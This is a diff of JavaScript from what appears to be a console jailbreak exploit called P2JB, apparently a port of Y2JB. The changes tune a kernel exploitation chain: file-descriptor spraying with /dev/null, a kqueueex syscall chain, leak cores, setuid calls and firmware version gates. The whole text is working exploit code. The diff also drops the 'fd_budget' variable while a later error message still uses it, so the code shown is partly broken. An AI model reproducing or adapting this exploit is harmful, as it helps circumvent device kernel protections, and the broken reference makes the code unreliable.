@@ -153,7 +153,7 @@
     }
 
     try {
-        const p2jb_version = "P2JB 2.6 (Y2JB -> NFJB port by wodz69) v.90";
+        const p2jb_version = "P2JB 2.6 (Y2JB -> NFJB port by wodz69) v0.91";
 
         const PAGE_SIZE = 0x4000;
 
@@ -194,7 +194,7 @@
         const MAIN_RTPRIO = 256;
 
         const LEAK_SYSCALLS = 0x100000001n;
-        const LEAK_FD_MAX = 8192n
+        const LEAK_NULL_FD_COUNT = 128n;
 
         const SYSCALL_EXTRA = {
             recvmsg: 0x1bn,
@@ -335,7 +335,7 @@
         let failcheck_path = null;
 
         let LEAK_CORES = [0, 1, 2, 3];
-        let LEAK_SYSCALLS_FINAL = 0xFFn;
+        let LEAK_SYSCALLS_FINAL = 0x0Fn;
 
         function my_init_threading() {
             const jmpbuf = malloc(0x60);
@@ -990,40 +990,10 @@
             write64_uncompressed(rl + 8n, nofile_hard);
             syscall(SYSCALL.setrlimit, 8n, rl);
 
-            const cand = ["/dev/null", "/dev/", "/", "/app0/", "/dev/urandom",
-                "/dev/notification0", "/dev/gc"];
-            let held_path = 0n;
-            let held_path_str = 0n;
-            for (let c = 0; c < cand.length; c++) {
-                const sp = alloc_string(cand[c]);
-                const a = syscall(SYSCALL.open, sp, O_RDONLY);
-                if (a === 0xffffffffffffffffn) continue;
-                const b = syscall(SYSCALL.open, sp, 0n);
-                syscall(SYSCALL.close, a);
-                if (b === 0xffffffffffffffffn) continue;
-                syscall(SYSCALL.close, b);
-                held_path = sp;
-                held_path_str = cand[c];
-                break;
-            }
+            const sp_dev_null = alloc_string("/dev/null");
+            const new_free_fd = () => syscall(SYSCALL.open, sp_dev_null, O_RDONLY);
 
-            const new_free_fd = () => held_path !== 0n
-                ? syscall(SYSCALL.open, held_path, O_RDONLY)
-                : syscall(SYSCALL.socket, 28n, 2n, 0n);
-
-            const probe_fds = [];
-            for (let i = 0; i < LEAK_FD_MAX; i++) {
-                const pfd = new_free_fd();
-                if (pfd === 0xffffffffffffffffn) break;
-                probe_fds.push(pfd);
-            }
-            const fd_budget = probe_fds.length;
-            for (let i = 0; i < probe_fds.length; i++)
-                syscall(SYSCALL.close, BigInt(probe_fds[i]));
-
-            let free_fds_num = fd_budget - 96;
-            if (free_fds_num > 2048) free_fds_num = 2048;
-
+            let free_fds_num = LEAK_NULL_FD_COUNT;
             const R_ESTIMATE = 69 + 12 + 1 + 1;
             const BURST_MIN = R_ESTIMATE + 40;
             if (free_fds_num < BURST_MIN)
@@ -1031,7 +1001,7 @@
                     " must exceed R~" + R_ESTIMATE + " with margin (need >=" +
                     BURST_MIN + "); fd_budget=" + fd_budget);
 
-            logger.log("prepare_fds: free_fd_path=" + held_path_str + " fd_budget=" + fd_budget);
+            logger.log("prepare_fds: free_fds_num=" + free_fds_num);
 
             syscall(SYSCALL.setuid, 1n);
 
@@ -1078,7 +1048,6 @@
                     normal: normal_w, queued: 0n
                 });
             }
-
 
             const FEED_CHUNK_BIG = BigInt(FEED_CHUNK);
             const _sleep_ts = malloc(16);
@@ -1141,10 +1110,12 @@
             }
 
             if (LEAK_SYSCALLS_FINAL > 0n) {
-                logger.log("launching kqueueex final chain len=" + toHex(LEAK_SYSCALLS_FINAL));
+                nanosleep_ms(5000);
+                logger.log("launching kqueueex final chain len=" + toHex(LEAK_SYSCALLS_FINAL) + " on the main thread");
                 execute_kqueueex_final_chain(LEAK_SYSCALLS_FINAL);
                 logger.log("kqueueex final chain finished successfully");
             }
+            nanosleep_ms(5000);
 
             logger.log("preparing free-fd");
             for (let i = 0; i < free_fds_num; i++) {
@@ -1160,7 +1131,6 @@
         }
 
         function free_one_fd(S) {
-
             if (S.free_fd_idx >= S.free_fds.length)
                 fail("free_one_fd: free_fds pool exhausted (idx=" +
                     S.free_fd_idx + "/" + S.free_fds.length + ")");
@@ -2099,7 +2069,7 @@
 
         logger.log(p2jb_version +" FW: " + FW_VERSION);
 
-        if (compare_version(FW_VERSION, "12.0") >= 0) {
+        if (compare_version(FW_VERSION, "11.0") >= 0) {
             LEAK_CORES = [0, 1];
         }
 
